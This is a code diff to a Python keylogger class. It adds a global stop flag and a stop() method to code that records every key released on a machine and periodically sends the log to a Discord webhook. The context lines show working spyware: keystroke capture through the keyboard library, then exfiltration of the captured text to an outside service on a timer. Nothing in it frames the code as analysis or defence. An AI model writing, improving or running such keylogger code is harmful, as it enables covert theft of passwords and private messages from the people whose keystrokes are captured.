@@ -13,8 +13,13 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.webhook = webhook
+        global STOP
+        STOP = False
 
     def callback(self, event):
+        global STOP
+        if STOP:
+            return
         name = event.name
         if len(name) > 1:
             if name == "space":
@@ -29,6 +34,9 @@ class Keylogger:
         self.log += name
 
     def report_to_webhook(self):
+        global STOP
+        if STOP:
+            return
         flag = False
         webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
         if len(self.log) > 2000:
@@ -47,6 +55,9 @@ class Keylogger:
             os.remove(path)
 
     def report(self):
+        global STOP
+        if STOP:
+            return
         if self.log:
             self.end_dt = datetime.now()
             if self.report_method == "webhook":
@@ -58,7 +69,13 @@ class Keylogger:
         timer.start()
 
     def start(self):
+        global STOP
+        STOP = False
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
+
+    def stop(self):
+        global STOP
+        STOP = True
